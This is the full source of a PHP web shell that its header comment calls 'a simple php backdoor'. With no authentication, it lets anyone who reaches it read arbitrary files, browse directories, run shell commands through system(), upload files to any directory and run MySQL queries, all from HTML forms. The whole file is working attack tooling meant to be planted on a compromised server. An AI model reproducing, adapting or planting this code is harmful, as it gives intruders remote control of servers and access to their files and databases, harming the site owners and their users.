<?
// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombie \\

ob_implicit_flush();
if(isset($_REQUEST['f'])){
        $filename=$_REQUEST['f'];
        $file=fopen("$filename","rb");
	header("Content-Type: text/plain");
        fpassthru($file);
        die;
}
if(isset($_REQUEST['d'])){
        $d=$_REQUEST['d'];
        echo "<pre>";
        if ($handle = opendir("$d")) {
	$files = array();
        echo "<h2>listing of $d</h2><hr>";
                   while ($dir = readdir($handle)){ 
                   	if (is_dir("$d/$dir")) $type="dir";
			else $type="file";

			$files[$dir]=$type;
                }
	 ksort($files);
	foreach ($files as $f=>$t) {
		if ($t == "dir") {
                	echo "<a href='$PHP_SELF?d=$d/$f'><font color=grey>$f/</font></a><br />";
			}
		else {
			echo "<a href='$PHP_SELF?f=$d/$f'><font color=black>$f</font></a><br />";
			}
		}
                       
        } else echo "opendir() failed";
        closedir($handle);
        die ("<hr>"); 
}
if(isset($_REQUEST['c'])){
	echo "<pre>";
	system($_REQUEST['c']);		   
	die;
}
if(isset($_REQUEST['upload'])){

		if(!isset($_REQUEST['dir'])) die('hey,specify directory!');
			else $dir=$_REQUEST['dir'];
		$fname=$HTTP_POST_FILES['file_name']['name'];
		if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], "$dir$fname"))
			die('file uploading error.');
}
if(isset($_REQUEST['mquery'])){
	
	$host=$_REQUEST['host'];
	$usr=$_REQUEST['usr'];
	$passwd=$_REQUEST['passwd'];
	$db=$_REQUEST['db'];
	$mquery=$_REQUEST['mquery'];
	mysql_connect("$host", "$usr", "$passwd") or
    die("Could not connect: " . mysql_error());
    mysql_select_db("$db");
    $result = mysql_query("$mquery");
	if($result!=FALSE) echo "<pre><h2>query was executed correctly</h2>\n";
    while ($row = mysql_fetch_array($result,MYSQL_ASSOC)) print_r($row);  
    mysql_free_result($result);
	die;
}

$curdir = getcwd();
print "Current directory is: $curdir<br />";
if (preg_match("/^[a-zA-Z]:\//", $curdir, $match)) {
	print "Browse: <a href=\"?d=$match[0]\">/</a><br />";
	}
else {
	print "Browse: <a href=\"?d=/\">/</a><br />";
	}
print "Browse: <a href=\"?d=$curdir\">$curdir</a><br /><hr>";

?>
<br />
<form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="c"><input type="submit" value="go"><hr></form> 
<br />
<form enctype="multipart/form-data" action="<?php echo $PHP_SELF; ?>" method="post"><input type="hidden" name="MAX_FILE_SIZE" value="1000000000">
upload file:<input name="file_name" type="file">   to dir: <input type="text" name="dir">&nbsp;&nbsp;<input type="submit" name="upload" value="upload"></form>
<hr>
<br />
To browse:<br />
<hr>
<br />
Execute mysql query:
<br />
<br />
<form action="<? echo $PHP_SELF; ?>" METHOD=GET >
host:<input type="text" name="host"value="localhost">
<br />
user: <input type="text" name="usr" value=root>
<br />
password: <input type="text" name="passwd">
<br />
database: <input type="text" name="db">
<br />
query: <input type="text" name="mquery">
<br />
<input type="submit" value="execute">
</form>

<!--	http://michaeldaw.org	2006 	-->
